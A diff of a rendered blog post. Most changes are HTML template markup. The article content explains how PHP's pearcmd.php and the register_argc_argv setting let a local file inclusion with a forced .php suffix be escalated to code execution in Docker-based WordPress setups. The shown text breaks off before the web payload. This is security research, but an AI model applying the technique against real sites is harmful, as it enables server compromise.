@@ -10,7 +10,7 @@
   <meta itemprop="description" content="Technical analysis and proof-of-concept demonstrating an LFI bypass (forced .php suffix) leveraging pearcmd.php">
   <meta itemprop="datePublished" content="2025-10-22T20:48:00+07:00">
   <meta itemprop="dateModified" content="2025-11-25T21:12:53+07:00">
-  <meta itemprop="wordCount" content="2714">
+  <meta itemprop="wordCount" content="2719">
   <meta itemprop="image" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png">
   <meta itemprop="keywords" content="Analyst,Lfi,Plugin,Pearcmd"><meta property="og:url" content="http://localhost:1313/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/">
   <meta property="og:site_name" content="Bui Van Y">
@@ -43,7 +43,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "http:\/\/localhost:1313\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/"
-    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, lfi, plugin, pearcmd","wordcount":  2714 ,
+    },"image": ["http:\/\/localhost:1313\/images\/avatar.png"],"genre": "posts","keywords": "analyst, lfi, plugin, pearcmd","wordcount":  2719 ,
     "url": "http:\/\/localhost:1313\/posts\/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd\/","datePublished": "2025-10-22T20:48:00+07:00","dateModified": "2025-11-25T21:12:53+07:00","publisher": {
       "@type": "Organization",
       "name": "/images/avatar.png","logo": "http:\/\/localhost:1313\/images\/avatar.png"},"author": {
@@ -138,8 +138,8 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Exploiting LFI2RCE Vulnerability via PHP PEARCMD</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analysis/" class="post-category" title="Category - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="published on 2025-10-22 20:48:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-22">2025-10-22</time></span>&nbsp;<span title="Updated on 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="2714 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>13 minutes</span>&nbsp;</div>
-    </div><div class="featured-image"><img src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png' alt="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png"></div><div class="details toc" id="toc-static" data-kept="false">
+      <div class="post-meta-line"><span class="post-author"><a href="github.com/w41bu1" title="Author" rel=" author" class="author"><img class="avatar" src='/images/avatar.png' alt="Bui Van Y" height="16" width="16">&nbsp;Bui Van Y</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/cve-analysis/" class="post-category" title="Category - CVE Analysis"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CVE Analysis</a></span></div><div class="post-meta-line"><span title="published on 2025-10-22 20:48:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-10-22">2025-10-22</time></span>&nbsp;<span title="Updated on 2025-11-25 21:12:53"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-11-25">2025-11-25</time></span>&nbsp;<span title="2719 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>13 minutes</span>&nbsp;</div>
+    </div><div class="featured-image"><img loading="eager" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png' sizes="(max-width: 680px) 100vw, (max-width: 960px) 80vw, (max-width: 1440px) 56vw, 800px" alt="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/app.png" height="630" width="1200"></div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
           <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
@@ -156,7 +156,7 @@
     <li><a href="#exploit">Exploit</a></li>
   </ul>
 </nav></div>
-      </div><div class="content" id="content"><p>Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to <strong>have a <code>.php</code> suffix</strong>. This significantly reduces exploitability. During my research I found the article <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp"target="_blank" rel="external nofollow noopener noreferrer">docker-php-include-getshell</a>. That article describes a way to <strong>bypass the <code>.php</code> constraint</strong> by abusing the <code>pearcmd.php</code> file which is part of PHP&rsquo;s <strong>PECL/PEAR</strong> toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios.</p>
+      </div><div class="content" id="content"><p>Hello. After analyzing 10 CVEs related to LFI in WordPress plugins, I noticed a common barrier: many exploitation vectors are constrained by the requirement to <strong>have a <code>.php</code> suffix</strong>. This significantly reduces exploitability. During my research I found the article <a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp" target="_blank" rel="external nofollow noopener noreferrer">docker-php-include-getshell</a>. That article describes a way to <strong>bypass the <code>.php</code> constraint</strong> by abusing the <code>pearcmd.php</code> file which is part of PHP&rsquo;s <strong>PECL/PEAR</strong> toolkit and is present in WordPress environments deployed on Docker — a very practical trick for no-upload scenarios.</p>
 <h2 class="heading-element" id="what-are-pear-and-pecl"><span>What are PEAR and PECL?</span>
   <a href="#what-are-pear-and-pecl" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
@@ -168,26 +168,26 @@
 <p>Before PHP <code>7.3</code>, PEAR/PECL were often installed by default.
 From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</code> to include them.</p>
 <p>However, in official PHP Docker images, PEAR/PECL <strong>are still often included</strong>, located under <code>/usr/local/lib/php</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# ls /usr/local/lib/php
-</span></span><span class="line"><span class="cl">Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">Archive  Console  OS  PEAR  PEAR.php  Structures  System.php  XML  build  data  doc  extensions  pearcmd.php  peclcmd.php  test</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 class="heading-element" id="pearcmdphp-and-register_argc_argv"><span><code>pearcmd.php</code> and <code>register_argc_argv</code></span>
   <a href="#pearcmdphp-and-register_argc_argv" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h2><p><code>pearcmd.php</code> is a PHP script designed to run in CLI mode, for example:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php /usr/local/lib/php/pearcmd.php install somepackage</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php /usr/local/lib/php/pearcmd.php install somepackage</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>It processes arguments from <code>$argv</code> and <code>$argc</code>. When run as CLI this data is obvious. If this file is included in a web context (via LFI), its CLI logic can be abused.</p>
 <p>The key point is the <code>register_argc_argv</code> setting. If <code>register_argc_argv = On</code>, PHP will populate:</p>
@@ -196,7 +196,7 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 <li><code>$argv</code></li>
 <li><code>$_SERVER['argv']</code></li>
 </ul>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" title="`argv` in PHP configuration" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" data-sub-html="<h2>argv</h2><p>`argv` in PHP configuration</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png' alt="argv" height="190" width="844"></a><figcaption class="image-caption">`argv` in PHP configuration</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" title="`argv` in PHP configuration" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png" data-sub-html="<h2>argv</h2><p>`argv` in PHP configuration</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv.png' alt="argv" height="190" width="844"></a><figcaption class="image-caption">`argv` in PHP configuration</figcaption>
   </figure></p>
 <p>When WordPress is set up on Docker, <code>register_argc_argv</code> is often enabled by default. The question becomes: when PHP runs under a web SAPI (FPM/Apache) and not in CLI, where does <code>$argv</code> come from?</p>
 <h2 class="heading-element" id="analysis-of-php-source-code"><span>Analysis of PHP Source Code</span>
@@ -204,8 +204,8 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h2><p>In the PHP core there is logic like:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -221,15 +221,15 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nf">php_build_argv</span><span class="p">(</span><span class="nf">SG</span><span class="p">(</span><span class="n">request_info</span><span class="p">).</span><span class="n">query_string</span><span class="p">,</span> <span class="o">&amp;</span><span class="nf">PG</span><span class="p">(</span><span class="n">http_globals</span><span class="p">)[</span><span class="n">TRACK_VARS_SERVER</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>If there is no <code>argc</code> (not running CLI), PHP calls <code>php_build_argv</code> with <code>SG(request_info).query_string</code> — i.e., the URL&rsquo;s <strong>query string</strong>. For example:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/index.php?a=b&amp;c=d</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://example.com/index.php?a=b&amp;c=d</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>→ <code>query_string = &quot;a=b&amp;c=d&quot;</code></p>
 <p>PHP will use this query string to build the <code>argv</code> variables, so <code>$_SERVER['argv']</code> can be influenced by the query string.</p>
@@ -241,20 +241,20 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
   </a>
 </h2><p>RFC3875 (the CGI spec) defines a form of <strong>&ldquo;indexed&rdquo; HTTP query</strong> — that is, a query string without unencoded <code>=</code> characters sent via GET or HEAD.</p>
 <p>When encountering such a query, the server <strong>SHOULD</strong> treat the query-string as a <strong>search-string</strong>, splitting it into <strong>search-words</strong> separated by <code>+</code>:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">search-string = search-word ( &#34;+&#34; search-word )
-</span></span><span class="line"><span class="cl">search-word = 1*schar</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">search-word = 1*schar</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>After splitting, each <code>search-word</code> is URL-decoded, optionally re-encoded as system-defined, then <strong>added to the command-line argument list (<code>argv</code>)</strong> of the CGI program.</p>
 <p>In short: if the query-string contains no <code>=</code> and is a GET or HEAD request, the server may treat parts separated by <code>+</code> as arguments and pass them into <code>argv</code>.</p>
 <p><strong>RFC3875</strong> allows a server to turn an &ldquo;indexed&rdquo; query-string (GET/HEAD, no unencoded <code>=</code>) into an argv list. The spec excerpt:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -292,10 +292,10 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">After parsing, each search-word is URL-decoded, optionally encoded in
 </span></span><span class="line"><span class="cl">a system-defined manner and then added to the command line argument
-</span></span><span class="line"><span class="cl">list.</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">list.</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
-</div><p>PHP previously had a vulnerability related to this (<a href="https://nvd.nist.gov/vuln/detail/cve-2012-1823"target="_blank" rel="external nofollow noopener noreferrer">CVE-2012-1823</a>). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains <code>=</code>, it can still be added to <code>$_SERVER['argv']</code>.</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" title="PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" data-sub-html="<h2>equal</h2><p>PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png' alt="equal" height="276" width="1058"></a><figcaption class="image-caption">PHP still adds query strings containing '=' into $_SERVER\['argv']</figcaption>
+</div><p>PHP previously had a vulnerability related to this (<a href="https://nvd.nist.gov/vuln/detail/cve-2012-1823" target="_blank" rel="external nofollow noopener noreferrer">CVE-2012-1823</a>). Today, PHP handles the query-string more broadly than RFC suggests — even when the query-string contains <code>=</code>, it can still be added to <code>$_SERVER['argv']</code>.</p>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" title="PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png" data-sub-html="<h2>equal</h2><p>PHP still adds query strings containing &#39;=&#39; into $_SERVER\[&#39;argv&#39;]</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/equal.png' alt="equal" height="276" width="1058"></a><figcaption class="image-caption">PHP still adds query strings containing '=' into $_SERVER\['argv']</figcaption>
   </figure></p>
 <p>👉 By passing a query string like <code>?a+b+c+...</code>, PHP will split on <code>+</code> and create <code>$_SERVER['argv']</code> as an array <code>['a', 'b', 'c', ...]</code>, consistent with RFC3875 semantics.</p>
 <h2 class="heading-element" id="testing-pear-in-cli"><span>Testing PEAR in CLI</span>
@@ -303,17 +303,17 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
 </h2><p>The author&rsquo;s article mentions a payload related to <code>config-create</code>, described as used to create a configuration file.</p>
-<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" title="Description of config-create" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" data-sub-html="<h2>doc-config</h2><p>Description of config-create</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png' alt="doc-config" height="387" width="608"></a><figcaption class="image-caption">Description of config-create</figcaption>
+<p><figure><a class="lightgallery" target="_blank" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" title="Description of config-create" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" data-sub-html="<h2>doc-config</h2><p>Description of config-create</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png' alt="doc-config" height="387" width="608"></a><figcaption class="image-caption">Description of config-create</figcaption>
   </figure></p>
 <p>When I tried running the command on CLI:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create
-</span></span><span class="line"><span class="cl">config-create: must have <span class="m">2</span> parameters, root path and filename to save as</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">config-create: must have <span class="m">2</span> parameters, root path and filename to save as</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>When not enough parameters are provided, the program errors and requires two mandatory parameters:</p>
 <ul>
@@ -321,27 +321,27 @@ From PHP <code>7.4</code> onward, PHP must be compiled with <code>--with-pear</c
 <li><code>filename</code>: the filename to save the configuration as.</li>
 </ul>
 <p>Trying with parameters:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
